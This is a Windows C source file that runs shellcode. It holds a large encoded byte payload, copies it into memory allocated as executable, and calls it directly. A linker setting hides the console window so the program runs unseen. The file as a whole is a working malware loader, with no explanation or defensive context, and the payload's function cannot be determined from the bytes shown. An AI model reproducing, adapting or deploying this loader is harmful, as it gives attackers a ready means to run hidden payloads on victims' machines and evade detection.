#include <windows.h>
#include <stdio.h>
typedef void(_stdcall* CODE)();
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
unsigned char shellcode[] = "\xbf\x41\x37\xb8\xa0\xd9\xc1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x78\x83\xea\xfc\x31\x7a\x0e\x03\x3b\x39\x5a\x55\x61\x90\x27"
"\x46\x30\xde\x03\xbe\x4e\xc5\x47\x1b\x9f\xcc\x19\xed\xee\xa5"
"\x41\x8d\xfb\xc6\x71\xfa\x3f\x71\x46\x1c\x0b\x7d\x2d\x22\x9e"
"\x4f\x04\xaf\x49\x6a\xff\x13\x71\xf9\xb6\x05\x26\x99\x45\x4f"
"\x7b\xed\x1a\xe9\x92\x0b\x21\x7d\x82\x1f\x57\xee\x01\x43\xff"
"\x62\x64\x5f\x48\x5a\x6e\x8b\x72\x71\x6d\x97\x35\x41\x98\x96"
"\xe1\xe3\x09\xe9\x37\xb0\x02\xb1\x82\xb5\x90\xa8\x34\x7c\x6d"
"\xe2\x80\x51\xf4\xf7\x30\xd7\xc7\xc3\x11\xae\x2b\x4b\x7b\x53"
"\x3e\xf9\x55\xb5\xdb\x66\x87\x11\x74\x9c\xa6\xac\xa1\x9b\x3c"
"\x8a\x89\x10\x10\x16\x06\x73\x19\xdc\x7b\xed\x49\xce\xce\xb3"
"\xd8\x7c\x7c\x78\x56\x3f\xac\x5b\x32\xb3\x14\x21\x52\xf7\x30"
"\xa5\xcd\x7b\x22\x4d\x48\xc8\x61\x23\x41\xcf\x41\xba\x57\x30"
"\x43\x0f\x59\x80\x4c\xe0\x73\x37\xb5\xd9\xc9\x93\x9a\x3c\x25"
"\xaa\x8a\x02\x98\x21\x07\x43\x8a\x16\x94\x61\xc2\xc3\x14\xb3"
"\xa6\x1b\x38\xd5\xfe\x57\xc2\x2d\xf9\xf4\x4c\xa1\x30\x8b\xe6"
"\x45\xdb\x6b\x8f\x40\xef\xc5\x20\xee\xc5\xa8\xea\x7b\xe6\x49"
"\xfb\xff\x79\x5b\xad\xc5\x72\xb5\x86\xc8\x5e\x13\x52\x5f\x8f"
"\x06\x91\xd4\xf8\xb1\xb9\x80\x5e\x34\x61\x08\xa4\x8f\x6d\x88"
"\xb5\x50\xbe\xb0\x3d\xf6\x39\x76\x1f\xfa\x3c\x2d\x9c\x71\x25"
"\xe5\xe3\x84\x45\x43\x7c\x66\x35\x44\xb8\x27\x3d\x7a\xd1\xa2"
"\xe8\x81\x07\xaf\x40\x36\x72\x5d\x90\x3c\x05\xd5\x72\x0b\x4d"
"\x9a\xb8\xf8\xae\xe2\x47\xe7\x63\x24\x3e\x9e\xcc\x14\x4d\x30"
"\x83\xcb\x6f\xf1\xb7\xd4\xce\x82\xaa\xe9\xd5\x48\x4e\x03\x01"
"\xe3\x36\x84\x4f\x5d\x3a\x8d\x36\xb1\xf1\x33\x04\x39\x87\xf4"
"\x12\xc9\x79\x41\xd8\xe2\x07\x7b\x9a\x33\xa4\x11\x59\xd6\x5d"
"\x78\x64\xaa\xaf\xe3\x28\x5b\x11\xec\xbe\xc1\x37\x12\x26\xc5"
"\x42\x4e\xf4\x1c\xc1\x8d\x4d\x6e\x83\xae\x04\xea\xfc\xc1\x89"
"\x7b\x7f\x21\xb1\x67\xd3\xf2\x83\x30\xe9\xfe\xab\x0c\x9a\xc8"
"\xd9\x4b\xf5\x43\x63\x4e\x93\x9a\x59\x68\xf4\x6e\xd9\xac\x65"
"\x8e\x73\xb3\xb8\x0b\xe1\x9f\xec\xd9\x1f\xd7\x71\x18\xbf\x1f"
"\x66\x30\x5c\x36\x63\x72\xd3\x90\x4d\xe6\xa1\x16\x45\xe9\x56"
"\x8f\x88\x21\x77\x3b\x1e\x47\x2b\xf2\x60\x58\x01\x9c\xa1\x6e"
"\xa5\x24\x8a\x59\x37\x1a\xd1\xb7";

void main()
{
    PVOID p = NULL;
    p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (p == NULL)
    {
        return;
    }
    memcpy(p, shellcode, sizeof(shellcode)+1);

    CODE code = (CODE)p;
    code();
}